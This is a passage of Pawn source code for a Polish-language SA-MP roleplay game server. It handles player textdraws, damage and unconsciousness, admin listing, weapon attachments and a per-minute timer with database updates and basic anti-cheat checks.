	AJTextDraw[playerid] = CreatePlayerTextDraw(playerid, 314.362945, 356.833160, " ");
	PlayerTextDrawLetterSize(playerid, AJTextDraw[playerid], 0.403276, 1.903326);
	PlayerTextDrawAlignment(playerid, AJTextDraw[playerid], 2);
	PlayerTextDrawColor(playerid, AJTextDraw[playerid], -1);
	PlayerTextDrawSetShadow(playerid, AJTextDraw[playerid], 0);
	PlayerTextDrawSetOutline(playerid, AJTextDraw[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid, AJTextDraw[playerid], 36);
	PlayerTextDrawFont(playerid, AJTextDraw[playerid], 1);
	PlayerTextDrawSetProportional(playerid, AJTextDraw[playerid], 1);
	PlayerTextDrawSetShadow(playerid, AJTextDraw[playerid], 0);


	Group[playerid] = CreatePlayerTextDraw(playerid, 553.777770, 143.916717, "Brak");
	PlayerTextDrawLetterSize(playerid, Group[playerid], 0.180730, 1.098330);
	PlayerTextDrawTextSize(playerid, Group[playerid], 5, 138.000000);
	PlayerTextDrawAlignment(playerid, Group[playerid], 2);
	PlayerTextDrawColor(playerid, Group[playerid], -1);
	PlayerTextDrawUseBox(playerid, Group[playerid], 1);
	PlayerTextDrawBoxColor(playerid, Group[playerid], 23);
	PlayerTextDrawSetShadow(playerid, Group[playerid], 0);
	PlayerTextDrawSetOutline(playerid, Group[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, Group[playerid], 23);
	PlayerTextDrawFont(playerid, Group[playerid], 1);
	PlayerTextDrawSetProportional(playerid, Group[playerid], 1);
	PlayerTextDrawSetShadow(playerid, Group[playerid], 0);
	PlayerTextDrawSetSelectable(playerid, Group[playerid], 1);

	Group2[playerid] = CreatePlayerTextDraw(playerid, 553.777648, 160.250076, "Brak");
	PlayerTextDrawLetterSize(playerid, Group2[playerid], 0.180730, 1.098330);
	PlayerTextDrawTextSize(playerid, Group2[playerid], 5, 138.000000);
	PlayerTextDrawAlignment(playerid, Group2[playerid], 2);
	PlayerTextDrawColor(playerid, Group2[playerid], -1);
	PlayerTextDrawUseBox(playerid, Group2[playerid], 1);
	PlayerTextDrawBoxColor(playerid, Group2[playerid], 23);
	PlayerTextDrawSetShadow(playerid, Group2[playerid], 0);
	PlayerTextDrawSetOutline(playerid, Group2[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, Group2[playerid], 23);
	PlayerTextDrawFont(playerid, Group2[playerid], 1);
	PlayerTextDrawSetProportional(playerid, Group2[playerid], 1);
	PlayerTextDrawSetShadow(playerid, Group2[playerid], 0);
	PlayerTextDrawSetSelectable(playerid, Group2[playerid], 1);

	Group3[playerid] = CreatePlayerTextDraw(playerid, 553.777648, 176.583343, "Brak");
	PlayerTextDrawLetterSize(playerid, Group3[playerid], 0.180730, 1.098330);
	PlayerTextDrawTextSize(playerid, Group3[playerid], 5, 138.000000);
	PlayerTextDrawAlignment(playerid, Group3[playerid], 2);
	PlayerTextDrawColor(playerid, Group3[playerid], -1);
	PlayerTextDrawUseBox(playerid, Group3[playerid], 1);
	PlayerTextDrawBoxColor(playerid, Group3[playerid], 23);
	PlayerTextDrawSetShadow(playerid, Group3[playerid], 0);
	PlayerTextDrawSetOutline(playerid, Group3[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, Group3[playerid], 23);
	PlayerTextDrawFont(playerid, Group3[playerid], 1);
	PlayerTextDrawSetProportional(playerid, Group3[playerid], 1);
	PlayerTextDrawSetShadow(playerid, Group3[playerid], 0);
	PlayerTextDrawSetSelectable(playerid, Group3[playerid], 1);

	GroupLabel[playerid] = CreatePlayerTextDraw(playerid, 553.309082, 127.583351, "Twoje grupy:");
	PlayerTextDrawLetterSize(playerid, GroupLabel[playerid], 0.181667, 1.057497);
	PlayerTextDrawTextSize(playerid, GroupLabel[playerid], 0.000000, 138.000000);
	PlayerTextDrawAlignment(playerid, GroupLabel[playerid], 2);
	PlayerTextDrawColor(playerid, GroupLabel[playerid], -1);
	PlayerTextDrawUseBox(playerid, GroupLabel[playerid], 1);
	PlayerTextDrawBoxColor(playerid, GroupLabel[playerid], 23);
	PlayerTextDrawSetShadow(playerid, GroupLabel[playerid], 0);
	PlayerTextDrawSetOutline(playerid, GroupLabel[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, GroupLabel[playerid], 23);
	PlayerTextDrawFont(playerid, GroupLabel[playerid], 1);
	PlayerTextDrawSetProportional(playerid, GroupLabel[playerid], 1);
	PlayerTextDrawSetShadow(playerid, GroupLabel[playerid], 0);

	DutyTxd[playerid] = CreatePlayerTextDraw(playerid, 516.763854, 3.333277, "Sluzba: ~y~Federal Bureau of Investigation");
	PlayerTextDrawLetterSize(playerid, DutyTxd[playerid], 0.169955, 0.923333);
	PlayerTextDrawAlignment(playerid, DutyTxd[playerid], 1);
	PlayerTextDrawColor(playerid, DutyTxd[playerid], -1);
	PlayerTextDrawSetShadow(playerid, DutyTxd[playerid], 0);
	PlayerTextDrawSetOutline(playerid, DutyTxd[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, DutyTxd[playerid], 22);
	PlayerTextDrawFont(playerid, DutyTxd[playerid], 1);
	PlayerTextDrawSetProportional(playerid, DutyTxd[playerid], 1);
	PlayerTextDrawSetShadow(playerid, DutyTxd[playerid], 0);

	ObjectInfo[playerid] = CreatePlayerTextDraw(playerid, 310.615112, 374.916717, "X: ~y~0.0 ~w~Y: ~y~0.0 ~w~Z: ~y~0.0~w~ rX: ~y~0.0~w~ rY: ~y~0.0 ~w~rZ: ~y~0.0");
	PlayerTextDrawLetterSize(playerid, ObjectInfo[playerid],0.209309, 1.028334);
	PlayerTextDrawAlignment(playerid, ObjectInfo[playerid], 2);
	PlayerTextDrawColor(playerid, ObjectInfo[playerid], -1);
	PlayerTextDrawSetShadow(playerid, ObjectInfo[playerid], 0);
	PlayerTextDrawSetOutline(playerid, ObjectInfo[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, ObjectInfo[playerid], 68);
	PlayerTextDrawFont(playerid, ObjectInfo[playerid], 1);
	PlayerTextDrawSetProportional(playerid, ObjectInfo[playerid], 1);
	PlayerTextDrawSetShadow(playerid, ObjectInfo[playerid], 0);

}

stock DestroyPlayerTextDraws(playerid)
{
	PlayerTextDrawDestroy(playerid, BottomTextDraw[playerid]);
	PlayerTextDrawDestroy(playerid, RadarTextDraw[playerid]);
	PlayerTextDrawDestroy(playerid, TextDrawDoorInfo[playerid]);
	PlayerTextDrawDestroy(playerid, BWTextDraw[playerid]);
	PlayerTextDrawDestroy(playerid, AJTextDraw[playerid]);
	PlayerTextDrawDestroy(playerid, Group2[playerid]);
	PlayerTextDrawDestroy(playerid, Group3[playerid]);
	PlayerTextDrawDestroy(playerid, GroupLabel[playerid]);
	PlayerTextDrawDestroy(playerid, Group[playerid]);
	PlayerTextDrawDestroy(playerid, DutyTxd[playerid]);
	PlayerTextDrawDestroy(playerid, ObjectInfo[playerid]);
}

cmd:anim (playerid, params[])
return ShowDialogAnim(playerid);

stock ShowDialogAnim(playerid)
{
	new list[1025], info[128];
	for(new i; i<MAX_ANIMS; i++)
	{
		format(info, sizeof(info), "//%s\n", AnimList[i][aCustomName]);
		strins(list, info, strlen(list));
		if(Isnull(AnimList[i+1][aName]))
		break;
	}
	return ShowPlayerDialog(playerid, D_ANIMS, DIALOG_STYLE_LIST, "Animacje (wybierz aby u¿yæ)", list, "Wybierz", "Anuluj");
}

new bool:pSawDM[MAX_PLAYERS];

forward DisableMsgDM(playerid, issuerid);
public DisableMsgDM(playerid, issuerid)
{
	pSawDM[playerid] = false; pSawDM[issuerid] = false;
}

public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart)
{
	if(weaponid == 49)
	{
		pWasInCar[playerid] = true;
		SetTimerEx("ClearWasInCar", 5000*2, false, "i", playerid);
		GetPlayerPos(playerid, PlayerCache[playerid][pPosX],  PlayerCache[playerid][pPosY],  PlayerCache[playerid][pPosZ]);
	}
	if(issuerid != INVALID_PLAYER_ID)
	{
		if(pTrainingTimer[playerid])
			return KickPlayer(issuerid, "System", "Przeszkadzanie w treningu na silowni");
		if(IsPlayerInAnyVehicle(issuerid))
		{
			if(GetPlayerVehicleSeat(issuerid) == 0)
			{
				if(weaponid <= 40)
				{
					return AJPlayer(issuerid, "System", "Anty-Cheat: Drive-By z pozycji kierowcy", 120);
				}
			}
		}
		if(PlayerCache[playerid][pBW_Time] > 0 || aduty[playerid])
		return 1;
		if(ClearNicknameColorTimer[playerid] == 0)
		{
			UpdateDynamic3DTextLabelText(pNick[playerid][nID], DAMAGE_COLOR, pNick[playerid][nStr]);
			KillTimer(ClearNicknameColorTimer[playerid]);
			ClearNicknameColorTimer[playerid] = SetTimerEx("ClearNicknameColor", 2500, false, "i", playerid);
		}
		new Float:damage =  2.0;
		switch(weaponid)
		{
			case 0:
			{
				if(PlayerCache[issuerid][pStrenght] >= 100)
				damage = PlayerCache[issuerid][pStrenght]/100;
			}
			case 2: damage = 3.0;
			case 3: damage = 10;
			case 5: damage = 3.0;
			case 6: damage = 3.0;
			case 7: damage = 3.0;
			case 22: damage = 4.0;
			case 23: damage = 0.0;
			case 24: damage = 30.0;
			case 25: damage = 6.0;
			case 28: damage = 1.5;
			case 29: damage = 3.5;
			case 30: damage = 20;
			case 31: damage = 18;
			case 32: damage = 2.0;
			case 33: damage = 10.0;
			case 34: damage = 50.0;
			case 38: damage = 0.1;
			case 41: damage = 0.5;
			case 42: damage = 0.5;

		}
		if(weaponid == 23)
		{
			if(WeaponCache[issuerid][wcVal3] == 0)
			{
				damage = 10;
			}
			else if(WeaponCache[issuerid][wcVal3] == 1)
			{
				new Float:X, Float:Y, Float:Z; GetPlayerPos(issuerid, X, Y, Z);
				if(IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z))
				{
					ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.1, 1, 0, 0, 1, 0);
					GameTextForPlayer(playerid, "~r~trafiono cie paralizatorem", 5000, 4);
					pCantClearAnim[playerid] = true;
					SetTimerEx("StandUp", 1000*30, false, "i", playerid);
				}
			}
		}
		if(PlayerCache[playerid][pHealth] - damage <= 0)
		{
			/*pShowingWeapon[playerid] = true;
			SetTimerEx("ShowingWeapon", 3000, false, "i", playerid);
			pWasInCar[playerid] = true;
			SetTimerEx("ClearWasInCar", 3000, false, "i", playerid);
			ClearAnimations(playerid);
			GetPlayerPos(playerid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ]);
			PlayerCache[playerid][pPosVW] = GetPlayerVirtualWorld(playerid);
			SendPlayerMe(playerid, "traci przytomnoœæ");
			PlayerCache[playerid][pBW_Reason] = weaponid;
			new puid = playerid;
			PlayerCache[puid][pHealth]=1;
			SetPlayerCameraPos(playerid, PlayerCache[puid][pPosX], PlayerCache[puid][pPosY], PlayerCache[puid][pPosZ]+10.0);
			SetPlayerCameraLookAt(playerid, PlayerCache[puid][pPosX], PlayerCache[puid][pPosY], PlayerCache[puid][pPosZ], CAMERA_CUT);
			PlayerCache[puid][pBW_Time] = 2;
			new msg[32];
			format(msg, sizeof(msg),  "Stan nieprzytomnosci przez: %d min", PlayerCache[puid][pBW_Time]);
			TextDrawForPlayer(playerid, 2, msg);
			ResetPlayerWeapons(playerid);
			TogglePlayerControllable(playerid, 0);
			ApplyAnimation(playerid, "crack", "crckdeth1", 4.1, 0, 0, 0, 1, 0, 0);
			UpdatePlayerName(playerid);*/

			BWPlayer(playerid, 5,weaponid);
			return 1;
		}
		SetPlayerHP(playerid, PlayerCache[playerid][pHealth]-damage);
	}
	else
	{
		if(ClearNicknameColorTimer[playerid] == 0 && !aduty[playerid])
		{
			UpdateDynamic3DTextLabelText(pNick[playerid][nID], DAMAGE_COLOR, pNick[playerid][nStr]);
			ClearNicknameColorTimer[playerid] = SetTimerEx("ClearNicknameColor", 2000, false, "i", playerid);
		}
		PlayerCache[playerid][pHealth] -= amount;
	}
	return 1;
}

forward StandUp(playerid);
public StandUp(playerid)
{
	pCantClearAnim[playerid] = false;
	ClearAnimations(playerid);
	TogglePlayerControllable(playerid, 1);
}

stock GetBWReason(playerid)
{
	new uid = PlayerCache[playerid][pUID], reason[64];
	if(PlayerCache[uid][pGender])
	{
		if(PlayerCache[uid][pBW_Reason] < 22)
		reason = "pobita";
		else if(PlayerCache[uid][pBW_Reason] > 22 && PlayerCache[uid][pBW_Reason] < 49)
		reason = "postrzelona z broni palnej";
		else if(PlayerCache[uid][pBW_Reason] == 49)
		reason = "potr¹cenie";
		else if(PlayerCache[uid][pBW_Reason] == 51)
		reason = "eksplozja";
		else if(PlayerCache[uid][pBW_Reason] == 53)
		reason = "utoniêcie";
		else if(PlayerCache[uid][pBW_Reason] == 54)
		reason = "pot³uczona";
	}
	else
	{
		if(PlayerCache[uid][pBW_Reason] < 22)
		reason = "pobity";
		else if(PlayerCache[uid][pBW_Reason] > 22 && PlayerCache[uid][pBW_Reason] < 49)
		reason = "postrzelony z broni palnej";
		else if(PlayerCache[uid][pBW_Reason] == 49)
		reason = "potr¹cenie";
		else if(PlayerCache[uid][pBW_Reason] == 51)
		reason = "eksplozja";
		else if(PlayerCache[uid][pBW_Reason] == 53)
		reason = "utoniêcie";
		else if(PlayerCache[uid][pBW_Reason] == 54)
		reason = "pot³uczony";
	}
	return reason;
}

stock SetPlayerHP(playerid, Float:HP)
{
	SetPlayerHealth(playerid, HP);
	PlayerCache[playerid][pHealth]=HP;
}


forward ClearNicknameColor(playerid);
public ClearNicknameColor(playerid)
{
	UpdateDynamic3DTextLabelText(pNick[playerid][nID], pNick[playerid][nColor], pNick[playerid][nStr]);
	ClearNicknameColorTimer[playerid] = 0;
}

cmd:a (playerid, params[])
{
	new list[525];
	format(list, sizeof(list), "nick\tuprawnienia\n");
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(aduty[i])
			format(list, sizeof(list), "%s%s\t%s%s\n", list, PlayerCache[i][pName], GetHexRankColor(PlayerCache[i][pLevel]),GetRankName(PlayerCache[i][pLevel]));
		}
	}
	if(strlen(list) < 25)
	return ShowDialogInfo(playerid, "Aktualnie nikt z ekipy nie znajduje siê online.");
	return ShowPlayerDialog(playerid, D_ADMINS, DIALOG_STYLE_TABLIST_HEADERS, "ekipa online", list, "OK", "");
}

stock ShowDialogInfo(playerid, const info[])
{
	ShowPlayerDialog(playerid, D_INFO, DIALOG_STYLE_MSGBOX, "Informacja", info, "ok", "");
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	pShowingWeapon[playerid] = true;
	SetTimerEx("ShowingWeapon", 3000, false, "i", playerid);
	pWasInCar[playerid] = true;
	SetTimerEx("ClearWasInCar", 3000, false, "i", playerid);
	Attacker[playerid] = -1;
	ResetPlayerWeapons(playerid);
	if(IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);
	new puid = playerid;
	PlayerCache[playerid][pBW_Reason] = reason;
	PlayerCache[puid][pHealth]=1;
	GetPlayerPos(playerid, PlayerCache[puid][pPosX], PlayerCache[puid][pPosY], PlayerCache[puid][pPosZ]);
	TogglePlayerSpectating(playerid, 1);
	SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), PlayerCache[puid][pPosX], PlayerCache[puid][pPosY], PlayerCache[puid][pPosZ], 0.0, 0, 0, 0, 0, 0 ,0);
	TogglePlayerSpectating(playerid, 0);
	SendPlayerMe(playerid, "traci przytomnoœæ");
	SetPlayerHP(playerid, 100);
	ApplyAnimation(playerid, "crack", "crckdeth1", 4.1, 0, 0, 0, 1, 0, 0);
	TogglePlayerControllable(playerid, 0);
	SetPlayerCameraPos(playerid, PlayerCache[puid][pPosX], PlayerCache[puid][pPosY], PlayerCache[puid][pPosZ]+10.0);
	SetPlayerCameraLookAt(playerid, PlayerCache[puid][pPosX], PlayerCache[puid][pPosY], PlayerCache[puid][pPosZ], CAMERA_CUT);
	PlayerCache[puid][pBW_Time] = 2;
	new msg[32];
	format(msg, sizeof(msg),  "Stan nieprzytomnosci przez: %d min", PlayerCache[puid][pBW_Time]);
	TextDrawForPlayer(playerid, 2, msg);
	ApplyAnimation(playerid, "crack", "crckdeth1", 4.1, 0, 0, 0, 1, 0, 0);
	UpdatePlayerName(playerid);
	UpdatePlayerInfo(playerid);
	return 1;
}

forward CheckCameraPos(playerid, Float:oldX, Float:oldY, Float:oldZ);
public CheckCameraPos(playerid, Float:oldX, Float:oldY, Float:oldZ)
{
	if(!pAFK[playerid])
	{
		new Float:X, Float:Y, Float:Z;
		GetPlayerCameraPos(playerid, X, Y,Z);
		if(oldX == X && oldY == Y && oldZ == Z)
		{
			pAFK[playerid] = true;
			UpdatePlayerName(playerid);
			PlayerTextDrawSetString(playerid, BWTextDraw[playerid], "AFK");
			PlayerTextDrawShow(playerid, BWTextDraw[playerid]);
		}
	}
}

stock ReturnAttachFreeSlot(playerid)
{
	for(new i=0; i<10; i++)
	{
		if(!IsPlayerAttachedObjectSlotUsed(playerid, i))
		return i;
	}
	return -1;
}

forward OnPlayerWeaponChange(playerid, weaponid);
public OnPlayerWeaponChange(playerid, weaponid)
{
	if(weaponid == WeaponCache[playerid][wcVal]){
		return RemovePlayerAttachedObject(playerid, 6);
	}
	new weapon = WeaponCache[playerid][wcVal];
	switch(weapon)
	{
		case 5:  SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,0.214000,-0.155999,-0.051000,2.200000,65.199981, 1.700000, 1, 1, 1, 0, 0);
		case 3:  SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,-0.179000,0.079999,-0.230999,88.500038,-79.399971,-4.199996, 1, 1, 1, 0, 0);
		case 33: SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,-0.158999,0.049999,0.155999,77.799972,178.399948, 3.099992, 1, 1, 1, 0, 0);
		case 22: SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,-0.158999,0.049999,0.155999,77.799972,178.399948, 3.099992, 1, 1, 1, 0, 0);
		case 23: SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,-0.158999,0.049999,0.155999,77.799972,178.399948, 3.099992, 1, 1, 1, 0, 0);
		case 24: SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,-0.158999,0.049999,0.155999,77.799972,178.399948, 3.099992, 1, 1, 1, 0, 0);
		case 30: SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,-0.118000,-0.133000,0.056000,7.699995,33.100013, -1.500000, 1, 1, 1, 0, 0);
		case 31: SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,0.011000,0.211000, -0.116000,178.299957,153.700164, -1.399997, 1, 1, 1, 0, 0);
		case 25: SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,-0.118000,-0.133000,0.056000,7.699995,33.100013, -1.500000, 1, 1, 1, 0, 0);
		case 28: SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,-0.006000,-0.089000,-0.163999,-2.099997,-3.299997,-175.099960, 1, 1, 1, 0, 0);
		case 29: SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,-0.006000,-0.089000,-0.163999,-2.099997,-3.299997,-175.099960, 1, 1, 1, 0, 0);
		case 32: SetPlayerAttachedObject(playerid, 6, GetWeaponModel(weapon), 1,-0.006000,-0.089000,-0.163999,-2.099997,-3.299997,-175.099960, 1, 1, 1, 0, 0);
	}
	
}

forward min_timer();
public min_timer()
{
	new query[1024];
	gettime(ghour, gmin, gsec);
	if(gmin==0)
	{
		format(gmsg, sizeof(gmsg), "** Dzwony w ratuszu wybijaj¹ %d:%02d godzinê. **", ghour, gmin);
		if(ghour==0)
		{
			gmsg = "** Dzwony w ratuszu wybijaj¹ pó³noc. **";

			query = "UPDATE players SET grouppayday = '0'";
			mysql_query(DB_HANDLE, query);
			query = "UPDATE players SET grouppayday2 = '0'";
			mysql_query(DB_HANDLE, query);
			query = "UPDATE players SET grouppayday3 = '0'";
			mysql_query(DB_HANDLE, query);

			for(new i; i<=GetPlayerPoolSize(); i++)
			{
				if(IsPlayerConnected(i))
				{
					/*if(pLogged[i])
					{
						if(PlayerCache[i][pGroupPayDay])
						{
							PlayerCache[i][pGroupPayDay] = false;
						}
						else if(PlayerCache[i][pGroupPayDay2])
						{
							PlayerCache[i][pGroupPayDay2] = false;
						}
						else if(PlayerCache[i][pGroupPayDay3])
						{
							PlayerCache[i][pGroupPayDay3] = false;
						}
						if(PlayerCache[i][pLevel] >= 7)
						SendClientMessage(i, COLOR_RED, "< Wybi³a pó³noc. Mo¿liwoœæ otrzymania PD zosta³a wznowiona >");
					}*/
				}
			}
		}
		SendClientMessageToAll(DO_SHADE_1, gmsg);
		SetWorldTime(ghour);
	}
	//new vuid;
	for(new i; i<=GetVehiclePoolSize(); i++)
	{
		//vuid = GetVehicleUID(i);
		if( PlayerCache[i][pCurrentVehicle][vEngine])
		{
			if( PlayerCache[i][pCurrentVehicle][vFuel] == 0)
			{
				SetVehicleParamsEx(i,  PlayerCache[i][pCurrentVehicle][vEngine]=0,  PlayerCache[i][pCurrentVehicle][vLights],  PlayerCache[i][pCurrentVehicle][vAlarm],  PlayerCache[i][pCurrentVehicle][vDoors],   PlayerCache[i][pCurrentVehicle][vBonnet], PlayerCache[i][pCurrentVehicle][vBoot],  PlayerCache[i][pCurrentVehicle][vObjective]);
				continue;
			}
			PlayerCache[i][pCurrentVehicle][vFuel]--;
			format(query, sizeof(query), "UPDATE vehicles SET fuel = '%d' WHERE uid = '%d'",  PlayerCache[i][pCurrentVehicle][vFuel],  PlayerCache[i][pCurrentVehicle][vUID]);
			mysql_query(DB_HANDLE, query, false);
		}
	}
	new Float:pH, guid;/*
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(pLogged[i])
			{
				if(pDuty[i])
				{
					guid = pDuty[i];
					if(PlayerCache[i][pGroup] == guid)
					{
						// Here we update duty time if they are outside and their group is special type(LSPD, FBI etc.)
						format(query, sizeof(query), "UPDATE players SET groupduty = '%d' WHERE uid = '%d'", PlayerCache[i][pUID]);

						if(GroupCache[guid][gType] == 16 || GroupCache[guid][gType] == 1 || GroupCache[guid][gType] == 2 || GroupCache[guid][gType] == 6)
						{
							PlayerCache[i][pGroupDuty]++;
							mysql_query(DB_HANDLE, query);
						}
						else
						{
							new duid = GetPlayerDoorUID(i);
							if(DoorCache[duid][dGroupUID] == guid)
							{
								PlayerCache[i][pGroupDuty]++;
								mysql_query(DB_HANDLE, query);
							}
							// We update players duty time, when they work at group's bussines.
						}
						// If player duty is 31 minutes and didn't has PayDay yet and group type IS NOT a party group.
						if(PlayerCache[i][pGroupDuty] == 31 && !PlayerCache[i][pGroupPayDay] && GroupCache[guid][gType] != 0)
						{
							if(!PlayerCache[i][pBankAccount]) 
							TextDrawForPlayerEx(i, 1, "~r~Nie posiadasz konta bankowego.~n~~w~Udaj sie do banku i wyrob konto bankowe aby moc~n~otrzymyac wyplaty!", 10000);
							else
							{
								PlayerCache[i][pGroupPayDay] = true;
								PlayerCache[i][pGroupDuty] = 0;

								PlayerCache[i][pBank]+=PlayerCache[i][pGroupReward];

								format(query, sizeof(query), "UPDATE players SET grouppayday = '1', groupduty = '0', bank = '%d' WHERE uid = '%d'", PlayerCache[i][pBank], PlayerCache[i][pUID]);
								mysql_query(DB_HANDLE, query);

								PlayerPlaySound(i, 4201, 0, 0, 0);
								format(query,sizeof(query), "** Otrzymujesz $%d wyp³aty **", PlayerCache[i][pGroupReward]);
								SendClientMessage(i, DO_SHADE_1, query);
							}
						}
					}
				}
				new Float:X, Float:Y, Float:Z;
				GetPlayerCameraPos(i, X, Y, Z);
				SetTimerEx("CheckCameraPos", 1000*30, false, "ifff", i, X, Y, Z);

				if(IsPlayerInAnyVehicle(i))
				{
					if(GetPlayerVehicleSeat(i) == 0)
					{
						if(GetVehicleSpeed(i) >= 360.0)
						{
							AJPlayer(i, "System", "Veh speedhack (A)", 30);
						}

						//vuid = GetVehicleUID(GetPlayerVehicleID(i));

						if( PlayerCache[i][pCurrentVehicle][vState] == 0 &&  PlayerCache[i][pCurrentVehicle][vOwner] != PlayerCache[i][pUID])
						{
							AJPlayer(i, "System", "Vehicle Jack (A)", 30);
						}
						if( PlayerCache[i][pCurrentVehicle][vState] == 2)
						{
							if(PlayerCache[i][pGroup] ==  PlayerCache[playerid][pCurrentVehicle][vOwner])
							{
								if(!PlayerCache[i][pGroupVehicle])
								{
									AJPlayer(i, "System", "Vehicle Jack (A)", 30);
								}
							}
							if(PlayerCache[i][pGroup2] ==  PlayerCache[playerid][pCurrentVehicle][vOwner])
							{
								if(!PlayerCache[i][pGroupVehicle2])
								{
									AJPlayer(i, "System", "Vehicle Jack (A)", 30);
								}
							}
							if(PlayerCache[i][pGroup3] ==  PlayerCache[playerid][pCurrentVehicle][vOwner])
							{
								if(!PlayerCache[i][pGroupVehicle3])
								{
									AJPlayer(i, "System", "Vehicle Jack (A)", 30);
								}
							}
						}
					}
				}
				GetPlayerHealth(i, pH);
				if(pH != PlayerCache[i][pHealth])
				SetPlayerHealth(i, PlayerCache[i][pHealth]);
				if(GetPlayerMoney(i) != PlayerCache[i][pCash])
				{
					ResetPlayerMoney(i);
					GivePlayerMoney(i, PlayerCache[i][pCash]);
				}

				PlayerCache[i][pPlayTime]++;
				format(query, sizeof(query), "UPDATE players SET playtime = '%d' WHERE uid = '%d'", PlayerCache[i][pPlayTime], PlayerCache[i][pUID]);
				mysql_query(DB_HANDLE, query, false);

				if(PlayerCache[i][pBW_Time])
				{
					PlayerCache[i][pBW_Time]--;

					format(query, sizeof(query), "UPDATE players SET bw_time = '%d' WHERE uid = '%d'", PlayerCache[i][pBW_Time], PlayerCache[i][pUID]);
					mysql_query(DB_HANDLE, query, false);

					format(query, sizeof(query), "Stan nieprzytomnosci przez: %dmin", PlayerCache[i][pBW_Time]);

					PlayerTextDrawSetString(i, BWTextDraw[i], query);
					PlayerTextDrawShow(i, BWTextDraw[i]);

					if(PlayerCache[i][pBW_Time] == 0)
					{
						
						TogglePlayerControllable(i, 1);

						if(!IsPlayerInAnyVehicle(i)){
							ClearAnimations(i);
							ApplyAnimation(i, "PLAYIDLES", "stretch", 8.1, false, false, false, false, 1, 1);
							PlayerCache[i][pHealth] = 5;
						} 
						
						SetCameraBehindPlayer(i);
						ShowDialogInfo(i, ""HEX_WHITE"Twoja postaæ ocknê³¹ siê po utracie przytomnoœci.\n\
						Mo¿esz zadzwoniæ po odpowiednie s³u¿by jeœli potrzebujesz odnowiæ zdrowie lub pójœæ do apteki i kupiæ lek.");
						PlayerTextDrawHide(i, BWTextDraw[i]);
						SetPlayerDrunkLevel(i, 4000);
						UpdatePlayerName(i);
					}
				}
				if(PlayerCache[i][pAJ_Time])
				{
					PlayerCache[i][pAJ_Time]--;

					format(query, sizeof(query),"UPDATE players SET aj_time = '%d' WHERE uid = '%d'", PlayerCache[i][pAJ_Time], PlayerCache[i][pUID]);
					mysql_query(DB_HANDLE, query);

					format(query, sizeof(query), "~r~~h~AdminJail: %dmin", PlayerCache[i][pAJ_Time]);
					PlayerTextDrawSetString(i, AJTextDraw[i], query);
					PlayerTextDrawShow(i, AJTextDraw[i]);
					if(PlayerCache[i][pAJ_Time] == 0)
					{
						if(PlayerCache[i][pPosX] != 0 && PlayerCache[i][pPosY] != 0 && PlayerCache[i][pPosZ] != 0)
						{
							SetPlayerPos(i, PlayerCache[i][pPosX], PlayerCache[i][pPosY], PlayerCache[i][pPosZ]);
							SetPlayerVirtualWorld(i, PlayerCache[i][pPosVW]);
						}
						else if(PlayerCache[i][pHouseSpawn] != 0)
						{
							new duid = PlayerCache[i][pHouseSpawn];
						//	SetPlayerPos(i, DoorCache[duid][dInsX], DoorCache[duid][dInsY], DoorCache[duid][dInsZ]);
						//	SetPlayerVirtualWorld(i, DoorCache[duid][dInsVW]);
						}
						else if(PlayerCache[i][pHouseSpawn] == 0)
						{
							SetPlayerPos(i, 1016.3893,-1314.6183,13.5469);
							SetPlayerVirtualWorld(i, 0);
						}
						PlayerTextDrawHide(i, AJTextDraw[i]);
					}
				}
				else if(PlayerCache[i][pJailTime])
				{
					PlayerCache[i][pJailTime]--;

					format(query, sizeof(query), "UPDATE players SET jail_time = '%d' WHERE uid = '%d'", PlayerCache[i][pJailTime], PlayerCache[i][pUID]);
					mysql_query(DB_HANDLE, query);


					if(!PlayerCache[i][pJailTime])
					{
						PlayerTextDrawHide(i, AJTextDraw[i]);
						UpdatePlayerName(i);
					}
					else
					{
						format(query, sizeof(query), "~g~~h~~h~Przetrzymanie: %dmin", PlayerCache[i][pJailTime]);
						PlayerTextDrawSetString(i, AJTextDraw[i], query);
						PlayerTextDrawShow(i, AJTextDraw[i]);
					}
				}
			}
		}
	}
	*/
}

cmd:me (playerid, params[])
{
	if(PlayerCache[playerid][pBW_Time])
	return ShowDialogInfo(playerid, "Nie mo¿esz teraz tego zrobiæ.");
/*	for(new i; i<MAX_ITEMS; i++)
	{
		if(ItemCache[i][iState] == ITEM_STATE_DRIVING)
		{
			if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
			{
				new groupuid = ItemCache[i][iGroupSender];
				new duid = GetGroupDoor(groupuid);
				if(pGetPack[playerid] == false)
				{
					if(IsPlayerInRangeOfPoint(playerid, 2.5, ServerSettings[magazinePosX], ServerSettings[magazinePosY], ServerSettings[magazinePosZ]))
					{
						if(IsPlayerInAnyVehicle(playerid))
						GameTextForPlayer(playerid, "~r~~h~wysiadz z pojazdu!", 3000, 4);
						DestroyDynamicMapIcon(pMapIcon[playerid]);
						pGetPack[playerid] = true;
